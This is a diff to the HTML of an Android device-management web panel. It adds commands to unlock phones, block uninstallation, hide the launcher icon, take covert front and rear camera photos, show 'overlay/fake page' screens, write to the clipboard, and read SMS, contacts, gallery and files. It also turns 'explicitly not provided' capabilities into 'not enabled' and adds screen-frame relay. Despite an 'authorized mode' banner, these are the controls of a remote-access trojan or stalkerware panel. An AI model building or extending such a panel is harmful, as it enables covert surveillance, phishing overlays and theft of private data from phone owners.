@@ -66,9 +66,12 @@
         <button class="nav-item active" data-view="dashboard"><span class="nav-icon">⌂</span><span>首页</span></button>
         <button class="nav-item admin-only" data-view="users"><span class="nav-icon">♙</span><span>管理员</span></button>
         <button class="nav-item" data-view="devices"><span class="nav-icon">▯</span><span>设备列表</span><span id="nav-device-count" class="nav-count">0</span></button>
+        <button class="nav-item" data-view="commands"><span class="nav-icon">≡</span><span>命令历史</span></button>
         <button class="nav-item" data-view="templates"><span class="nav-icon">◫</span><span>消息模板</span></button>
+        <button class="nav-item" data-view="configuration"><span class="nav-icon">⚙</span><span>设备配置</span></button>
         <button class="nav-item admin-only" data-view="builds"><span class="nav-icon">⌕</span><span>编译打包</span></button>
         <button class="nav-item" data-view="capabilities"><span class="nav-icon">▦</span><span>功能清单</span></button>
+        <button class="nav-item" data-view="system"><span class="nav-icon">⌁</span><span>连接与系统</span></button>
       </nav>
       <div class="sidebar-footer">
         <div class="safe-mode"><span class="pulse-dot"></span><div><strong>授权管理模式</strong><span>安全动作白名单已启用</span></div></div>
@@ -189,7 +192,7 @@
           <section class="panel table-panel">
             <div class="filter-bar command-filters">
               <div class="search-box"><span>⌕</span><input id="command-search" placeholder="搜索命令号、设备或操作员"></div>
-              <select id="command-action"><option value="">全部动作</option><option value="refresh_status">刷新状态</option><option value="show_support_prompt">显示支持说明</option><option value="open_battery_settings">电池设置</option><option value="open_autostart_settings">自启动设置</option><option value="request_screen_share">请求屏幕共享</option><option value="stop_screen_share">停止屏幕共享</option></select>
+              <select id="command-action"><option value="">全部动作</option><optgroup label="通用"><option value="refresh_status">刷新状态</option><option value="show_support_prompt">显示支持说明</option><option value="open_battery_settings">电池设置</option><option value="open_autostart_settings">自启动设置</option><option value="request_screen_share">请求屏幕共享</option><option value="stop_screen_share">停止屏幕共享</option></optgroup><optgroup label="控制区"><option value="unlock">一键解锁</option><option value="verify-unlock">锁屏验证</option><option value="translate">一键翻译</option><option value="lock-screen">锁屏</option><option value="uninstall-protection">防删</option><option value="launcher-icon">桌面图标</option><option value="power-menu">电源</option><option value="screenshot">截图</option><option value="front-camera">前-拍照</option><option value="rear-camera">后-拍照</option><option value="camera">实时预览</option><option value="open-app">打开应用</option><option value="uninstall-app">卸载应用</option><option value="overlay-mode">遮盖层/仿页</option><option value="clear-clipboard">清空剪切板</option><option value="write-clipboard">写入剪切板</option></optgroup><optgroup label="数据读取"><option value="workbench.messages">短信</option><option value="workbench.apps">应用</option><option value="workbench.system">系统</option><option value="workbench.permissions">权限</option><option value="workbench.gallery">相册</option><option value="workbench.contacts">通讯录</option><option value="workbench.files">文件</option><option value="workbench.clipboard">剪切板</option></optgroup></select>
               <select id="command-status"><option value="">全部状态</option><option value="queued">等待发送</option><option value="sent">已发送</option><option value="acknowledged">设备已收到</option><option value="success">成功</option><option value="failed">失败</option></select>
               <button id="command-search-button" class="primary-button small">查询</button>
             </div>
@@ -266,13 +269,13 @@
 
         <section id="view-capabilities" class="view">
           <div class="section-heading">
-            <div><p class="eyebrow">CAPABILITY MATRIX</p><h1>功能与接口清单</h1><p>已实现接口可以使用；素材中的未接入能力保留页面与 501 占位接口。</p></div>
-            <div class="capability-legend"><span class="implemented">已实现</span><span class="planned">未实现</span><span class="blocked">不能做</span></div>
+            <div><p class="eyebrow">PROTOCOL MATRIX</p><h1>功能清单</h1><p>逐项列出发给 Android 的消息、接收字段和后台保存位置。</p></div>
+            <div class="capability-legend"><span class="implemented">已实现</span><span class="planned">未实现</span><span class="blocked">未启用</span></div>
           </div>
           <div id="capability-summary" class="capability-summary">
             <article><span class="summary-icon implemented">✓</span><div><strong id="capability-implemented">—</strong><p>已实现功能</p></div></article>
             <article><span class="summary-icon planned">○</span><div><strong id="capability-planned">—</strong><p>规划中功能</p></div></article>
-            <article><span class="summary-icon blocked">×</span><div><strong id="capability-blocked">—</strong><p>明确不提供</p></div></article>
+            <article><span class="summary-icon blocked">×</span><div><strong id="capability-blocked">—</strong><p>未启用</p></div></article>
           </div>
           <section class="panel capability-panel">
             <div id="capability-list" class="capability-list"><div class="loading-block">正在加载功能清单…</div></div>
@@ -285,7 +288,7 @@
             <section class="panel system-card"><span class="system-icon">◎</span><div><h3>HTTP API</h3><p>登录、设备列表、状态补传、日志和命令创建。</p><code>/api/*</code></div><b class="status-pill success">正常</b></section>
             <section class="panel system-card"><span class="system-icon">⌁</span><div><h3>管理端实时通道</h3><p>向当前页面推送设备在线状态和命令结果。</p><code>/ws/dashboard</code></div><b id="system-dashboard-ws" class="status-pill warning">连接中</b></section>
             <section class="panel system-card"><span class="system-icon">▯</span><div><h3>Android 实时通道</h3><p>APK 心跳、状态上报、命令 ACK 与执行结果。</p><code>/ws/device</code></div><b class="status-pill neutral">等待设备</b></section>
-            <section class="panel system-card"><span class="system-icon">▤</span><div><h3>媒体通道</h3><p>屏幕共享需要用户授权；当前版本尚未实现媒体传输。</p><code>Not implemented</code></div><b class="status-pill neutral">未启用</b></section>
+            <section class="panel system-card"><span class="system-icon">▤</span><div><h3>媒体通道</h3><p>屏幕共享需要用户授权；支持中继 Android 回传的 JPEG/WebP 帧。</p><code>/ws/screen</code></div><b class="status-pill success">已实现</b></section>
           </div>
           <section class="panel boundary-panel"><h3>当前能力边界</h3><div><span>✓</span><p><strong>已实现</strong>设备状态、心跳、命令、日志和审计。</p></div><div><span>○</span><p><strong>需要 APK</strong>手机端必须按照对接文档实现并连接后，设备列表才会出现数据。</p></div><div><span>!</span><p><strong>明确授权</strong>屏幕协助必须经过手机持有人确认并显示持续通知。</p></div></section>
         </section>
@@ -312,6 +315,15 @@
       <label class="field-label" for="admin-confirm-password">当前管理员密码</label><input id="admin-confirm-password" type="password" required autocomplete="current-password" placeholder="用于敏感操作验证">
       <p class="reserved-note">谷歌验证码、IP白名单和备注字段按素材保留；当前账号接口尚未保存这些扩展字段。</p>
       <div class="modal-actions"><button id="cancel-user-dialog" class="secondary-button" type="button">关闭</button><button class="primary-button" type="submit">确认</button></div>
+    </form>
+  </dialog>
+
+  <dialog id="device-owner-dialog" class="modal small-modal">
+    <form id="device-owner-form">
+      <div class="modal-head"><div><h3>更换设备管理员</h3><p class="muted">更换后设备会从原管理员名下转移，原分组将自动清空。</p></div><button id="close-device-owner-dialog" class="icon-button" type="button">×</button></div>
+      <label class="field-label" for="device-owner-select">新管理员</label>
+      <select id="device-owner-select" required></select>
+      <div class="modal-actions"><button id="cancel-device-owner-dialog" class="secondary-button" type="button">关闭</button><button class="primary-button" type="submit">确认更换</button></div>
     </form>
   </dialog>
 
